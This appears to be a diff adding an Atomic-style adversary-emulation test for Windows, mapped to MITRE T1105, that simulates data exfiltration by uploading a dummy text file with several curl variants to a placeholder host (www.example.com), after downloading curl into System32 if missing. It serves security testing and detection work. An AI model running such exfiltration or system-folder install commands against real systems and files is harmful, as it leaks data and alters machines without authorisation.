@@ -1,0 +1,51 @@
+api_version: "2.0"
+name: Curl Upload File
+description: |
+    The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration
+    Expected output will include whether the file uploaded successfully or not.
+args:
+    - name: curl_path
+      type: path
+      default: C:\Windows\System32\Curl.exe
+    - name: remote_destination
+      type: string
+      default: www.example.com
+    - name: file_path
+      type: string
+      default: c:\temp\atomictestfile.txt
+uuid: 635c9a38-6cbf-47dc-8615-3810bc1167cf
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1105: Ingress Tool Transfer'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Curl must be installed on system.
+      inline: |
+        if (Test-Path #{curl_path}) {exit 0} else {{Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile PathToAtomicsFolder\..\ExternalPayloads\curl.zip
+        Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
+        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
+        Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl"
+        Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
+        }}
+      executor: powershell
+    - name: |
+        A file must be created to upload
+      inline: |
+        if (Test-Path #{file_path}) {exit 0} else {{echo "This is an Atomic Test File" > #{file_path}
+        }}
+      executor: powershell
+    - name: curl-upload-file
+      inline: |
+        {{.Args.curl_path}} -T {{.Args.file_path}} {{.Args.remote_destination}}
+        {{.Args.curl_path}} --upload-file {{.Args.file_path}} {{.Args.remote_destination}}
+        {{.Args.curl_path}} -d {{.Args.file_path}} {{.Args.remote_destination}}
+        {{.Args.curl_path}} --data {{.Args.file_path}} {{.Args.remote_destination}}
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
